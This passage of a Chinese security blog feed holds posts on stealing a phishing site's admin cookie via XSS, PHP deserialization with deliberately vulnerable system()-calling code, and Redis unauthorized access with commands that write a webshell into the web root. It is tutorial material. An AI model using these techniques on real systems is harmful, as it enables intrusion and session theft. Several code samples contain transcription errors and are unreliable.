漏洞黑进某个钓鱼网站++<br>根据提示注册使用，建议使用<del>国外没有备案的服务器</del>，懂的都懂</p><p>大佬写的详细博客：<a href="https://www.sqlsec.com/2020/10/xss2.html">国光的博客</a></p><ul><li><a href="https://github.com/Chalnl/BlueLotus_XSSReceiver">XSS数据接收平台</a></li></ul><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h58t6me38zj30ug0cbgpp.jpg" alt="image.png"></p><ul><li>从平台找到摸版合理使用 </li></ul><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h58tucqzi2j30z40hejzg.jpg" alt="image.png"></p><ul><li>了解他写的原理才是在重要的哦</li></ul><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h58tzbw6eej311o0l0q9z.jpg" alt="image.png"></p><p>我的JS - -&gt; 插入摸版 - - &gt; 修改网址 - - &gt; 生成paylode</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h58u6udy20j312x0c1wjc.jpg" alt="image.png"></p><p>将 <strong>paylode</strong> 输入到钓鱼网站，等待获取他管理页面的<strong>cookie</strong><br>(查看钓鱼网站是否有XSS漏洞可以先写于一段弹窗JS代码检验)</p><p>在接收摸版成功看到网站 cookie</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h58ua4428hj30r80c8gp0.jpg" alt="image.png"></p><p>获得 cookie 之后就能通过 BP 修改数据包 cookie 进入后台了<br>(后边考虑出一篇详细介绍<strong>web工作流程图</strong>，详细讲解<strong>cookie</strong>的作用)</p><ol><li><p>Kali Linux 自带的 Beef</p></li><li><p>自己动手，丰衣足食</p></li></ol><ul><li>XSS在线平台也有不少，也挺好用的<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h58svk2lfgj30xy0mdthu.jpg" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全 - JAVA 反序列化漏洞</title>
      <link href="/post/3bb6ca6c.html/"/>
      <url>/post/3bb6ca6c.html/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="3c5847886f72c8676417262f768fde138757a4e85e7cfa5f8ddc5272fe33e75a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 序列化反序列化 </tag>
            
            <tag> 加密内容 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全 - PHP 反序列化漏洞</title>
      <link href="/post/8dd96f30.html/"/>
      <url>/post/8dd96f30.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>PHP序列化给我们传递对象提供了一种简单的方法。将一个复杂的数据类型转换为字符串（序列化）存储在本地。在用到的时候能很方便地将硬盘上的字符串数据转换回原始的数据类型（反序列化)。</p><p>序列化的函数为 <strong>serialize</strong> (编码)</p><p>反序列化的函数为 <strong>unserialize</strong> (解码)</p><p>序列化和反序列化的目的是使得程序间<strong>传输对象会更加方便</strong>。</p><p>当 <strong>serialize</strong> 序列化对象时，PHP将试图在序列动作之前调用该对象的成员函数_sleep()，这样就允许对象在被序列化之前做任何清除操作。</p><p>类似的，<strong>当使用 unserialize() 恢复对象时</strong>，将调用 <strong>_wakeup()</strong> 成员函数。这也是PHP反序列化经典的考点， CTF  比赛中很多都是围绕着 PHP 反序列化对象的特性来突然 <strong>getshell</strong> 的，所以学习反序列化前得掌握「PHP基础的类与对象」。</p><h2 id="PHP-序列化和反序列化"><a href="#PHP-序列化和反序列化" class="headerlink" title="PHP 序列化和反序列化"></a>PHP 序列化和反序列化</h2><p>所有 PHP 里面的值都可以使用函数 serialize() 来返回一个包含字节流的字符串来表<br>示。 unserialize() 函数能够重新把字符串变回PHP原来的值。序列化一个对象将会保存对象的所有变量，但是<strong>不会保存对象的方法，只会保存类的名字</strong>。</p><p>序列化给我们传递对象提供了一种简单的方法。将一个变量的数据”转换为”字符串，但并不是类型转换，目的是将该字符串存储在本地。相反的行为称为反序列化。序列化和反序列化的目的是使得程序间传输对象会更加方便。</p><h3 id="serialize序列化"><a href="#serialize序列化" class="headerlink" title="serialize序列化"></a>serialize序列化</h3><p>将一个对象转换成一个字符串，函数描述如下:</p><p><code>serialize ( mixed $value ) : string</code></p><p>序列化实例:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">userinfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;姓名: &quot;</span>. <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;年龄:&quot;</span> . <span class="variable language_">$this</span>-&gt;age .<span class="string">&quot; \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$jack</span> = <span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line"><span class="variable">$jack</span> -&gt; name = <span class="string">&quot;Jack&quot;</span>;</span><br><span class="line"><span class="variable">$jack</span> -&gt; age = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$jack</span> -&gt; <span class="title function_ invoke__">userinfo</span>();   <span class="comment">//姓名:Jack年龄:18</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$jack</span>); <span class="comment">// 0:6:&quot;People&quot; :2:&#123;s :4 : &quot; name&quot; ; s :4: &quot;Jack&quot; ; s : 3: &quot;age&quot; ; i:18;&#125;</span></span><br></pre></td></tr></table></figure></p><p>其中序列化的字符串标准格式为:</p><p><code>0:类名长度:&quot;类名&quot;:属性数量:&#123;属性变量类型:属性变量长度;属性值类型:属性值长度...以此类推&#125;</code></p><p>在本次代码序列化后的具体字符串如下:</p><p><code>0:6:&quot;People&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;&#125;</code></p><p><code>0</code>:对象 <code>6</code>:类名长度 <code>“People&quot;</code>:类名<br><code>2</code>︰属性数量<br><code>s</code> :字符串 <code>4</code>:属性长度 <code>“name&quot;</code>:属性名 <code>s</code>:字符串 <code>4</code>:属性长度 <code>“Jack”</code>属性值<br><code>s</code> :字符串 <code>3</code>:属性长度 <code>“age”</code>:属性名 <code>i</code> :数值类型 <code>“18”</code>属性值</p><p>此外在类中的 <code>protected</code> (保护)变量和 <code>private</code>(私有）变量如果序列化的话，和<code>public</code>(公有)变量的格式稍微不太一样，具体发规则如下:</p><ul><li>protected 变量</li></ul><p><code>\x00 + * + \×00 + 变量名</code></p><ul><li>private变量<br><code>\x00 + 类名 + \×00 + 变量名</code></li></ul><p>具体看下面的实例代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span> =“男<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    public function userinfo( )&#123;</span></span><br><span class="line"><span class="string">        echo“姓名: &quot;</span>. <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;年龄:&quot;</span> . <span class="variable language_">$this</span>-&gt;age . <span class="string">&quot;性别:&quot;</span> . <span class="variable language_">$this</span>-&gt;sex . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$jack</span> = <span class="keyword">new</span> <span class="title class_">People</span>( );</span><br><span class="line"><span class="variable">$jack</span> -&gt; name = <span class="string">&quot;Jack&quot;</span>;</span><br><span class="line"><span class="variable">$jack</span> -&gt; <span class="title function_ invoke__">userinfo</span>( );  <span class="comment">// 姓名: Jack年龄:18性别:男</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$jack</span>);</span><br><span class="line"><span class="comment">// 0:6: &quot;&quot;People&quot;: 3:&#123;s: 4 : &quot;name&quot; ; s :4 : &quot;Jack&quot; ; s :6 : &quot;*age&quot; ; i:18;s:11: &quot;Peoplesex&quot; ; s :3:&quot;男&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>序列化的字符串为:</p><p><code>&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:6:&quot;*age&quot;;i:18;s:11:&quot;Peoplesex&quot;;s:3:&quot;男&quot;;&#125;</code></p><p>这里看不到<code>\x00</code> ，实际上通过属性长度可以发现是存在的，只是没有显示出来，为了达到显示效果，这里得使用<code>Python</code>的<code>request</code>模块来发起请求拿到原始数据值:</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5b9aqvngij315805aq4y.jpg" alt="image.png"></p><h3 id="unserialize-反序列化"><a href="#unserialize-反序列化" class="headerlink" title="unserialize 反序列化"></a>unserialize 反序列化</h3><p>将序列化后的字符串还原成一个对象，函数描述如下:</p><p><code>unserialize ( string $str ) : mixed</code></p><p>接下来把上面序列化的字符串:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">6</span>: <span class="string">&quot;People&quot;</span> :<span class="number">2</span>:&#123;s:<span class="number">4</span> : <span class="string">&quot;name&quot;</span> ; s:<span class="number">4</span>: <span class="string">&quot;Jack&quot;</span> ;s :<span class="number">3</span> : <span class="string">&quot;age&quot;</span> ;i:<span class="number">18</span>;&#125;</span><br></pre></td></tr></table></figure><br>尝试反序列化同去然后测洲l讨反序列化后的功能是否可以正常使用:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span> =<span class="string">&quot;男&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">userinfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;姓名: &quot;</span>. <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;年龄: &quot;</span>. <span class="variable language_">$this</span>-&gt;age . <span class="string">&quot;性别: &quot;</span> . <span class="variable language_">$this</span>-&gt;sex . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$jack</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;0:6:&quot;People&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$jack</span> -&gt; <span class="title function_ invoke__">userinfo</span>(); <span class="comment">//姓名:Jack年龄:18 性别:男</span></span><br></pre></td></tr></table></figure><p>发现功能依旧是正常的</p><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h3><p>用户可控传入的序列化数据，直接传递<code>unserialize</code> 函数，操作了类方法，常配合魔术方法来执行非预期的结果。</p><h4 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h4><p>魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>( <span class="string">&quot; charset=utf-8&quot;</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class magic_test</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    public <span class="subst">$data1</span> = &quot;</span>hello<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    public <span class="subst">$data2</span> = &quot;</span>world<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    public function print_data()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        echo <span class="subst">$this</span>-&gt;<span class="subst">$data1</span>. <span class="subst">$this</span>-&gt;<span class="subst">$data2</span>. &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    public function _construct()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">    echo &quot;</span> <span class="title function_ invoke__">__construct</span>() &lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    public function _destruct()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">    echo &quot;</span><span class="title function_ invoke__">_destruct</span>() &lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    public function __sleep()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        echo &quot;</span>_sleep &lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        return array (&quot;</span>data1<span class="string">&quot;,&quot;</span>data2<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    public function __wakeup()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">    echo &quot;</span><span class="title function_ invoke__">__wakeup</span>( ) &lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$obj</span> = new magic_test();</span></span><br><span class="line"><span class="string"><span class="subst">$serialized</span> = serialize(<span class="subst">$obj</span>);</span></span><br><span class="line"><span class="string">echo <span class="subst">$serialized</span>. &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$obj2</span> = unserialize( <span class="subst">$serialized</span> );</span></span><br><span class="line"><span class="string"><span class="subst">$obj2</span>-&gt;print_data( );</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5b9ofrqlrj30ln073gmg.jpg" alt="image.png"></p><p>常见的魔术方法的解释:</p><p><code>_construct</code> ，构造函数，PHP 5允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p><p><code>_destruct</code> ，析构函数，PHP 5引入了析构函数的概念，这类似于其它面向对象的语言，如 C++ 。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p><p><code>_sleep magic</code>方法在一个对象被序列化的时候调用。</p><p><code>_wakeup magic</code>方法在一个对象被反序列化的时候调用。</p><p><code>_toString</code> ,打印一个对象时，如果定义了 toString() 方法，就能在测试时，通过echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。</p><ul><li>小试牛刀</li><li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vul</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>( <span class="variable">$this</span>-&gt;<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5baex800lj30ba04z0tc.jpg" alt="image.png"></p><p>POSt一下 得到flag</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5bahy3ftmj30lj0f9gqs.jpg" alt="image.png" style="zoom:80%;" /></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 序列化反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全 - 未授权访问漏洞</title>
      <link href="/post/f519efa9.html/"/>
      <url>/post/f519efa9.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>未授权访问，顾名思义<strong>不进行请求授权的情况下对需要权限的功能进行访问执行</strong>。通常是由于<strong>认证页面存在缺陷</strong>，无认证，安全配置不当导致。<strong>常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能</strong>越权漏洞。<br>未授权访问通常是会<strong>泄露用户信息，系统信息</strong>。某些服务和系统中，未授权访问还可以<strong>执行系统命令，操作系统文件，导致系统的整体安全遭到破坏</strong>。</p><ul><li><strong>常见未授权访问漏洞总结</strong>  <a href="http://xz.aliyun.com/t/6103">xz.aliyun.com/t/6103</a></li></ul><h3 id="Redis-未授权访问"><a href="#Redis-未授权访问" class="headerlink" title="Redis 未授权访问"></a>Redis 未授权访问</h3><p>Redis是一个开源的使用ANSIC语言编写、支持网络、可基于内存亦可持久化的<strong>日志型、Key-Value数据库</strong>，并提供多种语言的API。<br>Redi 因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可<strong>导致敏感信息泄露</strong>，也可以恶意执行操作。</p><h4 id="Redis环境搭建"><a href="#Redis环境搭建" class="headerlink" title="Redis环境搭建"></a>Redis环境搭建</h4><ul><li>Windows安装 推荐linux装<br>下载地址: <a href="https://github.com/microsoftarchive/redis/releases">https://github.com/microsoftarchive/redis/releases</a></li></ul><p>打开一个cmd窗口使用命令切换到 Redis 运行:</p><p><code>redis-server.exe redis.windows.conf</code></p><p>后面的那个redis.windows.conf可以省略，如果省略，会启用默认的。输入之后，会显示如下界面:<br><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h553ksapn0j30qj0c9dkh.jpg" alt="image.png"></p><p>这时候另启一个CMD窗口，原来的不要关闭，不然就无法访问服务端了。</p><p><strong>一些基本的交互命令:</strong><br><strong>切换到Redis目录下运行:</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h127.0.0.1 -p 6379</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看Redis的相关信息</span></span><br><span class="line">127.0.0.1:6379&gt;info</span><br><span class="line"></span><br><span class="line"><span class="comment">#SET 设置键值对测试</span></span><br><span class="line">127.0.0.1:6379&gt;SET X<span class="string">&quot;Tomorrow is a another day&quot;</span></span><br><span class="line">oK</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; GET X</span><br><span class="line"><span class="string">&quot;Tomorrow is a another day&quot;</span></span><br></pre></td></tr></table></figure><ul><li><strong>Linux编译安装</strong><br>下载地址:<a href="https://redis.io/download">https://redis.io/download</a></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载Redis</span></span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#解压</span></span><br><span class="line">tar zxvf redis-5.0.5..tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#到src目录下</span></span><br><span class="line"><span class="built_in">cd</span> redis-5.0.5/src</span><br><span class="line"></span><br><span class="line"><span class="comment">#编译</span></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Redis服务:</span></span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure><blockquote><p>注意这种方式启动Redis使用的是默认配置。也可以通过启动参数告诉Redis使用指定配置文件使用下面命令启动。./src/redis-server redis.conf其中 <strong>redis.conf 是一个默认的配置文件</strong>。我们可以<strong>根据需要使用自己的配置文件</strong>。</p></blockquote><p>启动Redis服务进程后，就可以<strong>使用测试客户端程序redis-cli和Redis服务交互了</strong>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali-linux:~/ redis-5.0.5/src<span class="comment"># ./ redis-cli -h 127.0.0.1 -p 6379</span></span><br><span class="line">127.0.0. 1:6379&gt;SET y <span class="string">&quot;Linux Redis is Running&quot;</span></span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; GET y</span><br><span class="line"><span class="string">&quot;Linux Redis is Running&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h5517wgupsj30q507o436.jpg" alt="image"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#操作目录</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line">OK.</span><br><span class="line"></span><br><span class="line"><span class="comment">#操作文件</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置数据</span></span><br><span class="line">10.211.55.4:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;&lt;?php phpinfo( ) ; ?&gt;&quot;</span></span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入数据</span></span><br><span class="line">10.211.55.4:6379&gt;save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><ul><li><strong>Linux apt 安装</strong></li></ul><p>在 <strong>Ubuntu</strong> 系统安装 <strong>Redis</strong> 可以使用以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#更新源</span></span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装redis</span></span><br><span class="line">$ sudo apt-get install redis-server</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动redis</span></span><br><span class="line">$ redis-server</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试连接</span></span><br><span class="line">$ redis-cli</span><br></pre></td></tr></table></figure><h3 id="未授权访问修改公私钥"><a href="#未授权访问修改公私钥" class="headerlink" title="未授权访问修改公私钥"></a>未授权访问修改公私钥</h3><p>Redis 未授权访问在4.x/5.0.5以前版本下，我们可以使用 master/slave 模式加载远程模块，通过动态链接库的方式执行任意命令。</p><h4 id="安装配置SSH"><a href="#安装配置SSH" class="headerlink" title="安装配置SSH"></a>安装配置SSH</h4><p>首先受害者 Redis 的服务器配置好公司钥登录的情况下可以直接<strong>通过修改秘钥来直接登录到服务器</strong>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#更新源</span></span><br><span class="line">apt update</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装openssh-server</span></span><br><span class="line">apt install openssh-server</span><br><span class="line"></span><br><span class="line"><span class="comment">#允许root远程登陆</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PermitRootLogin yes&quot;</span> &gt;&gt;/etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment">#SSH开机自启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> sshd</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启SSH</span></span><br><span class="line">systemctl start sshd</span><br></pre></td></tr></table></figure><p>客户端尝试连接服务器尝试：</p><p><img 